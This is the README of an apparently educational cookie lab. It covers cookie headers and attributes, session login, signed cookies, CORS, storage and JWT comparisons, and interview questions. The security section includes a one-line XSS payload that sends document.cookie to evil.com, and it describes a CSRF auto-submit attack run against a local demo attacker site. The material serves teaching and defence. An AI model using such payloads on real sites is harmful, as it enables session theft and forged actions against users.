# Cookies Concept: everything about HTTP cookies

Notes plus hands-on demos covering how cookies work, every attribute, sessions, security (XSS, CSRF, session fixation), cookies vs storage vs JWT, and interview questions.

## Run it

```bash
npm start            # no npm install needed: zero dependencies, Node 18+
```

| URL | What it is |
|---|---|
| http://localhost:3000 | Lab home |
| http://localhost:3000/visual.html | Animated visual: how a cookie travels (5 scenes) |
| http://localhost:3000/cookies.html | Playground: set cookies from JS and from the server, compare views |
| http://localhost:3000/theme.html | Dark mode remembered in a cookie |
| http://localhost:3000/auth.html | Login session (HttpOnly) + CSRF attack demo |
| http://127.0.0.1:3001 | The "attacker" site used in the CSRF demo |

> Cookies **don't work on `file://` pages**. Always open the pages through the server.

```
Cookies_concept/
├── server/
│   ├── server.js         # node:http server: Set-Cookie, sessions, signed cookie, CSRF
│   ├── cookie-utils.js   # parse / serialize / sign / unsign, written from scratch
│   └── attacker.html     # evil site on 127.0.0.1:3001
└── client/
    ├── index.html        # hub
    ├── visual.html       # step-by-step animation
    ├── cookies.html      # playground
    ├── theme.html        # dark mode cookie
    ├── auth.html         # bank login + CSRF
    ├── cookie-helpers.js # getCookie / setCookie / deleteCookie
    └── style.css
```

---

## 1. What is a cookie?

HTTP is **stateless**: every request is new and the server doesn't remember the last one. A cookie fixes that.

A **cookie** is a small `name=value` string that:
1. the **server** asks the browser to store, using the `Set-Cookie` response header (or JS writes it with `document.cookie`), and
2. the **browser** sends back automatically on every later request that matches, using the `Cookie` request header.

```
Browser                                      Server
  | ---- POST /login ----------------------->  |   checks password, creates session
  | <--- 200 OK                                |
  |      Set-Cookie: sid=a91f; HttpOnly; ...   |
  |   (browser stores it in its cookie jar)    |
  | ---- GET /cart                             |
  |      Cookie: sid=a91f ------------------>  |   looks up sid -> "pappu"
  | <--- 200 OK  (Pappu's cart)                |
```

**Three main uses**
- **Session management**: login state, cart, CSRF tokens
- **Personalisation**: theme, language, region
- **Tracking**: analytics, ads (mostly third-party cookies)

---

## 2. The two headers

**Response → `Set-Cookie`**: one header **per cookie**. You can't put two cookies in one `Set-Cookie`.

```http
HTTP/1.1 200 OK
Set-Cookie: sid=a91f; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600
Set-Cookie: theme=dark; Path=/; Max-Age=604800
```

**Request → `Cookie`**: **one** header holding all matching cookies, as `name=value` pairs only. Attributes are never sent back.

```http
GET /cart HTTP/1.1
Host: shop.com
Cookie: sid=a91f; theme=dark
```

In Node, `res.setHeader('Set-Cookie', [a, b])` takes an **array** so it can send several headers. See `sendJson` in `server/server.js`.

---

## 3. Attributes (the cookie's rules)

| Attribute | Example | Meaning |
|---|---|---|
| `Expires` | `Expires=Wed, 21 Oct 2026 07:28:00 GMT` | Absolute end time (uses the client's clock). |
| `Max-Age` | `Max-Age=3600` | Lifetime in seconds. **Wins over Expires.** `0` or negative = delete now. |
| *(neither)* | | **Session cookie**: deleted when the browser closes (session restore can keep it). |
| `Domain` | `Domain=shop.com` | Also sent to subdomains (`api.shop.com`). **Without it = host-only**: exact host, no subdomains. A site can't set a cookie for another domain, or for a public suffix like `.com` / `.co.in`. |
| `Path` | `Path=/admin` | Sent only when the URL path starts with this (`/admin`, `/admin/users`, not `/administrator`). Default = folder of the current URL, so **always set `Path=/`**. |
| `Secure` | | Only sent over HTTPS (browsers count `http://localhost` as secure). |
| `HttpOnly` | | JavaScript **can't read it** (`document.cookie` hides it). Blocks cookie theft by XSS. Only the server can set it. |
| `SameSite` | `Strict` / `Lax` / `None` | Decides whether it goes on **cross-site** requests. See section 5. |
| `Partitioned` | | CHIPS: a third-party cookie stored per top-level site. Needs `Secure`. |

**Cookie prefixes** (the browser enforces these):
- `__Secure-name`: must have `Secure`.
- `__Host-name`: must have `Secure`, `Path=/`, and **no** `Domain`, so it is locked to one exact host. Best choice for session cookies: `__Host-sid=...`.

**Identity of a cookie** = `name + domain + path`. The same name with a different path is a **different** cookie. To **update or delete** one, you must send the same name, domain and path.

**Limits**: about **4 KB per cookie** (name + value), about **50+ cookies per domain** (it depends on the browser). Every cookie goes with **every** matching request, including images and CSS, so big cookies slow down the whole site.

**Values**: no `;`, `,` or spaces without encoding. Use `encodeURIComponent` / `decodeURIComponent`.

---

## 4. Cookies from JavaScript: `document.cookie`

```js
document.cookie = "theme=dark; max-age=604800; path=/; samesite=lax"; // sets ONE cookie
document.cookie = "lang=hi; path=/";                                  // adds another, doesn't replace
console.log(document.cookie); // "theme=dark; lang=hi"  (no attributes, no HttpOnly cookies)
document.cookie = "theme=; max-age=0; path=/";                         // delete
```

What's odd about it:
- **Writing** sets one cookie. **Reading** returns them all as one string.
- You **can't** set `HttpOnly` from JS.
- You **can't** read a cookie's attributes (expiry, path...) from JS. Use DevTools → Application → Cookies.
- The newer **Cookie Store API** (`await cookieStore.get('theme')`, `cookieStore.set({...})`) is async and gives you attributes. Browser support is limited.

Helpers: `client/cookie-helpers.js`.

---

## 5. Same-site vs cross-site, and SameSite

**Origin** = scheme + host + port (`https://app.shop.com:443`).
**Site** = scheme + **registrable domain** (`https://shop.com`). Ports and subdomains don't change the site.

| From → To | Same origin? | Same site? |
|---|---|---|
| `https://shop.com` → `https://shop.com/cart` | yes | yes |
| `https://app.shop.com` → `https://api.shop.com` | no | **yes** |
| `http://localhost:3001` → `http://localhost:3000` | no | **yes** (port doesn't matter) |
| `http://127.0.0.1:3001` → `http://localhost:3000` | no | **no** ← used by our attacker demo |
| `https://evil.com` → `https://shop.com` | no | no |

**SameSite values**

| Value | Sent on same-site requests | Cross-site top-level GET (clicking a link) | Cross-site POST / iframe / fetch / img |
|---|---|---|---|
| `Strict` | ✅ | ❌ (you arrive "logged out" from links) | ❌ |
| `Lax` *(default when not set)* | ✅ | ✅ | ❌ |
| `None` (needs `Secure`) | ✅ | ✅ | ✅ |

- Chrome treats a cookie **without** SameSite as `Lax`. It also has a 2-minute exception that allows top-level POSTs for new cookies with no SameSite set. Don't rely on it: always set SameSite yourself.
- `SameSite=None` **without** `Secure` is rejected.
- Common pattern: session cookie `Lax`; cookies used inside a cross-site iframe or widget `None; Secure` (plus `Partitioned`).

---

## 6. Kinds of cookies

- **Session vs persistent**: no expiry vs `Max-Age`/`Expires`.
- **First-party vs third-party**: set by the site in the address bar vs by another domain loaded inside it (an ad iframe, a tracking pixel). Third-party cookies power cross-site tracking. Safari and Firefox block them by default. Chrome kept them but gives users controls. Alternatives: CHIPS (`Partitioned`), Storage Access API, server-side tracking.
- **Zombie / supercookies**: re-created from other storage after you delete them. Know the term.

---

## 7. Session cookie login: the full flow

What `server/server.js` does (see `/api/login`, `/api/me`, `/api/logout`):

1. **Login**: check the password, then create a **new random** session id (`crypto.randomBytes(32)`) and store `sid → { user, csrfToken }` on the server (Redis or a DB in real apps).
2. Send `Set-Cookie: sid=<random>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600`.
3. **Every request**: read `sid` from the `Cookie` header, then look up the user. Missing, unknown or expired → `401`.
4. **Logout**: delete the session **on the server** and clear the cookie (`Max-Age=0`).

**Why a random id instead of `userId=42`?** Anyone can edit a cookie. `userId=42` → change it to `43` and you're someone else. A random 256-bit id can't be guessed.

**Session fixation**: an attacker gets you to use a session id they already know, and once you log in, they're logged in too. Fix: **always create a new id at login** (the demo deletes the old session).

**Sliding vs absolute expiry**: sliding = extend on each request (stay logged in while active); absolute = a hard cap (for example 24h) no matter what. Banks use both.

---

## 8. Signed cookies (and encrypted ones)

When you *do* want to keep data in the cookie itself (not just an id), **sign** it:

```
visits=7.Q2mM3n...   ← value "7" + HMAC-SHA256(value, SECRET)
```

- The server recomputes the HMAC. If it doesn't match, the cookie was tampered with, so reject it. Compare with `crypto.timingSafeEqual`, not `===`.
- Signing gives **integrity, not secrecy**: the user can still *read* `7`. If you need secrecy, **encrypt** it (AES-GCM). That is what "cookie sessions" in Rails, `iron-session` etc. do.
- Try it: `cookies.html` → `/api/visits`, then edit the number in DevTools.

Code: `sign` / `unsign` in `server/cookie-utils.js`.

---

## 9. Security

### XSS (Cross-Site Scripting) → cookie theft
If an attacker runs JS on your page, `fetch('https://evil.com?c=' + document.cookie)` steals every non-HttpOnly cookie.
**Fix**: `HttpOnly` on auth cookies, plus escape output and add a Content-Security-Policy. HttpOnly stops the *theft*, but an XSS script can still *make requests as you* while it runs, so preventing XSS still matters most.

### CSRF (Cross-Site Request Forgery)
The browser attaches cookies **no matter which site started the request**. evil.com can auto-submit `<form action="https://bank.com/transfer" method="POST">`, and your session cookie rides along. evil.com never reads the cookie; it just *uses* it.

Defences (use more than one):
1. **`SameSite=Lax` or `Strict`**: the cookie isn't sent on cross-site POSTs.
2. **CSRF token**: a random token tied to the session that the real page sends in a header (`X-CSRF-Token`) or form field. The attacker can't read it, because the same-origin policy / CORS blocks reading responses.
   - *Synchronizer token* (stored in the session; what this demo does) or *double-submit cookie* (token in a non-HttpOnly cookie + header; the server checks they match).
3. **Check `Origin` / `Sec-Fetch-Site`** headers on state-changing requests.
4. **Never change state on GET.**

Demo: `auth.html` + the attacker site. With `SameSite=None` the unsafe endpoint gets robbed and the safe one doesn't. With `Lax`, both are safe.

### Other things to know
- **Always `Secure`** in production. Otherwise the cookie can be sniffed on HTTP or public Wi-Fi.
- **Subdomain risk**: `Domain=shop.com` cookies can be read and **overwritten** by any subdomain (for example a hacked `blog.shop.com`). Use `__Host-` cookies.
- **Cookie tossing**: a subdomain sets a cookie with the same name to shadow yours. `__Host-` prevents this.
- **Don't store secrets or PII** in readable cookies.
- **Logout must kill the server session**, or a stolen cookie still works.

### Recommended session cookie
```http
Set-Cookie: __Host-sid=<random-256-bit>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

---

## 10. CORS and cookies

`fetch` **doesn't send cookies cross-origin** unless you ask:

```js
fetch('https://api.shop.com/me', { credentials: 'include' }); // 'same-origin' is the default
```

And the server must reply with:
```http
Access-Control-Allow-Origin: https://app.shop.com   ← exact origin, NOT *
Access-Control-Allow-Credentials: true
```
With axios: `withCredentials: true`. If the API is on a **different site**, the cookie also needs `SameSite=None; Secure`.

---

## 11. Cookies vs localStorage vs sessionStorage vs IndexedDB

| | Cookie | localStorage | sessionStorage | IndexedDB |
|---|---|---|---|---|
| Size | ~4 KB each | ~5–10 MB | ~5 MB | large (hundreds of MB+) |
| Sent to server automatically | **Yes, every request** | No | No | No |
| Expiry | You choose | Never | When the tab closes | Never |
| JS access | Yes, unless HttpOnly | Yes | Yes | Yes (async) |
| Scope | domain + path | origin | origin + **tab** | origin |
| Readable by XSS | No if HttpOnly | **Yes** | **Yes** | **Yes** |
| Good for | auth session, SSR prefs | UI prefs, cache | one-tab wizard state | offline data |

---

## 12. Cookie sessions vs JWT

| | Session id in a cookie (stateful) | JWT (stateless) |
|---|---|---|
| Where the data lives | Server (Redis/DB) | Inside the token (signed) |
| Logout / revoke | Easy: delete the session | Hard: valid until expiry (needs a denylist or short expiry + refresh token) |
| Scaling | Needs a shared store | Any server can verify it |
| Size | Tiny id | Bigger (claims + signature) |
| Best storage | HttpOnly cookie | **Also an HttpOnly cookie** (not localStorage, where XSS can steal it) |

"JWT vs cookies" is a false choice: a cookie is a **transport**, a JWT is a **format**. A common good setup: a short-lived access JWT plus a long-lived refresh token, both in `HttpOnly; Secure; SameSite` cookies, with CSRF protection.

---

## 13. Express / Next.js quick reference

```js
// Express
res.cookie('sid', id, { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 3600_000, path: '/' }); // maxAge in ms!
res.clearCookie('sid', { path: '/' });
app.use(require('cookie-parser')(SECRET)); // req.cookies, req.signedCookies

// Next.js (App Router)
import { cookies } from 'next/headers';
(await cookies()).set('theme', 'dark', { maxAge: 604800, path: '/' });
(await cookies()).get('theme')?.value;
```
Watch out: Express `maxAge` is in **milliseconds**, but the `Max-Age` header is in **seconds**.

---

## 14. Debugging cookies

- DevTools → **Application → Cookies**: see every cookie with its attributes; edit or delete them.
- DevTools → **Network → a request → Cookies tab**: what was sent, what was set, and **why a cookie was blocked** (yellow warning icon).
- Cookie not saved? Common reasons: `SameSite=None` without `Secure`; `Secure` on plain HTTP (not localhost); `Domain` doesn't match; over the size limit; third-party cookie blocking.
- Cookie not sent? Path mismatch, cross-site + Lax/Strict, expired, or `fetch` without `credentials: 'include'`.
- `curl -i http://localhost:3000/api/visits` shows raw `Set-Cookie`; `curl -b "visits=1.bad" ...` sends a cookie.

---

## 15. Interview questions (with short answers)

1. **What is a cookie and why do we need it?** A small key-value string stored by the browser and sent back automatically, to keep state over stateless HTTP.
2. **How does the server set a cookie, and how does it get it back?** `Set-Cookie` response header (one per cookie) → `Cookie` request header (all matching cookies together).
3. **Session vs persistent cookie?** No `Expires`/`Max-Age` = deleted when the browser closes; with one = lives until that time.
4. **`Expires` vs `Max-Age`?** Absolute date vs seconds from now. `Max-Age` wins and doesn't depend on the client's clock.
5. **What does HttpOnly protect against? What doesn't it protect against?** It stops JS from reading the cookie, so XSS can't steal it. It does *not* stop CSRF, or XSS making requests while it runs.
6. **Explain SameSite Strict / Lax / None.** See the table in section 5. Lax is the default; None needs Secure.
7. **What is CSRF and how do you prevent it?** The browser auto-attaches cookies on requests started by another site. Prevent it with SameSite, CSRF tokens, Origin checks, and no state changes on GET.
8. **How do you delete a cookie?** Set it again with the same name/path/domain and `Max-Age=0` (or a past `Expires`).
9. **Can JS on `a.com` read cookies of `b.com`?** No, never. Not even with CORS.
10. **Where should you store a JWT?** In an HttpOnly, Secure, SameSite cookie, not localStorage, because XSS can read localStorage.
11. **First-party vs third-party cookies?** Set by the site you're visiting vs by an embedded other domain. Third-party cookies are used for tracking and blocked by many browsers.
12. **Why use a random session id instead of storing the user id in a cookie?** Cookies can be edited, so a user id is easy to forge. A random id is unguessable, and the real data stays on the server.
13. **What is session fixation?** An attacker plants a known session id before you log in. Fix: create a new id at login.
14. **Signed vs encrypted cookie?** Signed = the user can read it but not change it (HMAC). Encrypted = the user can't read it either.
15. **Cookie size limit, and why keep cookies small?** About 4 KB. They're sent on every request, even for images, so they add latency.
16. **Why doesn't my `fetch` send cookies to my API?** It's cross-origin: you need `credentials: 'include'` + `Access-Control-Allow-Credentials: true` + an exact `Allow-Origin` (+ `SameSite=None; Secure` if it's cross-site).
17. **What do `__Host-` and `__Secure-` do?** Browser-enforced rules: Secure (and, for `__Host-`: Path=/ with no Domain), which blocks subdomain overwrite and cookie tossing.
18. **Cookies vs localStorage?** See section 11. Main differences: auto-sent to the server, HttpOnly option, size.
19. **System design: how would you keep users logged in across 10 app servers?** Store sessions in a shared Redis (keyed by sid), or use stateless signed tokens. Avoid sticky sessions.
20. **What does `Partitioned` (CHIPS) do?** It stores a third-party cookie separately per top-level site, so it works inside embeds but can't track users across sites.

---

## 16. Practice tasks

- [ ] Change the session cookie name to `__Host-sid` in `server.js`. What breaks on `http://localhost` and why? (Hint: Secure.)
- [ ] Add a "remember me" checkbox: session cookie if unticked, 30-day `Max-Age` if ticked.
- [ ] Make the session expiry sliding: refresh `Max-Age` on every `/api/me`.
- [ ] Replace the synchronizer token with the double-submit cookie pattern.
- [ ] Add an `Origin` header check to `/api/transfer-safe`.
- [ ] Encrypt the visits cookie with AES-256-GCM instead of just signing it.
